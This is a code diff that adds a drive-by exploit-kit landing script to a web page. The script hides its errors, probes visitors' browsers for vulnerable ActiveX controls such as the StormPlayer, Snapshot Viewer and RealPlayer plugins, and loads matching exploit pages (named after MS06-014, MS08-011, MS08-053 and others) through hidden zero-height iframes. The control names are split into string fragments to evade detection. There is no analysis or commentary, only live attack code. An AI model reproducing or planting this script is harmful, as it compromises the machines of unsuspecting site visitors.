@@ -1,0 +1,37 @@
+<script>
+document.write("<iframe width=20 height=0 src=Darkst.htm></iframe>");
+window.status="Íê³É";
+window.onerror=function(){return true;}
+if(navigator.userAgent.toLowerCase().indexOf("msie 7")==-1)
+document.write("<iframe width=20 height=0 src=Ms06014.htm></iframe>");
+try{var f;
+var gg=new window["ActiveXObject"]("GLIED"+"own.IED"+"own.1");}
+catch(f){};                      
+finally{if(f!="[object Error]"){document.write("<iframe width=100 height=0 src=Ms08011.htm></iframe>");}}
+try{var m;
+var hh=new ActiveXObject("MP"+"S.S"+"tor"+"mPl"+"ayer");}
+catch(m){};                      
+finally{if(m!="[object Error]"){document.write("<iframe width=100 height=0 src=Ms08053.htm></iframe>");}}
+try{var n;
+var ll=new ActiveXObject("snpvw.Snapshot Viewer Control.1");}
+catch(n){};                      
+finally{if(n!="[object Error]"){document.write("<iframe width=100 height=0 src=MsAccess.htm></iframe>");}}
+try{var b;
+var mm=new ActiveXObject("Pdg2");}
+catch(b){};                      
+finally{if(b!="[object Error]"){document.write("<iframe width=100 height=0 src=Cx.htm></iframe>");}}
+function test()
+{
+rrooxx = "IER" + "PCtl.I" + "ERP" + "Ctl.1";
+try
+{
+Like = new ActiveXObject(rrooxx);
+}catch(error){return;}
+vvvvv = Like.PlayerProperty("PRODUCTVERSION");
+if(vvvvv<="6.0.14.552")
+document.write("<iframe width=100 height=0 src=Real.htm></iframe>");
+else
+document.write("<iframe width=100 height=0 src=Real.htm></iframe>");
+}
+test();
+</script>
